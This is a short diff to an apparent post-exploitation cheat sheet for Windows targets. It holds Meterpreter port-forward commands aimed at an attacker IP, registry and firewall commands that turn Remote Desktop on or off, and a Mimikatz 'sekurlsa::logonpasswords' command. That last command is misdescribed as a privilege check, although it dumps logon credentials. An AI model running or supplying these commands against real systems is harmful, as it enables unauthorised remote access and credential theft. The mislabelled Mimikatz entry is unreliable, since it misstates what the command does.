@@ -9,3 +9,16 @@ meterpreter> portfwd add -R -p 1234 -l 443 -L <attacker IP>: this will open a po
 
 meterpreter> portfwd: This will help in listing the active port forwards
 
+
+Enable Remote Desktop via Registry Edit and Enable Firewall Rule
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+Disable Remote Desktop via Registry Edit and Disable Firewall Rule
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+Mimikatz:
+
+Mimikatz privilege::debug sekurlsa::logonpasswords : To check the privileges on the system
+
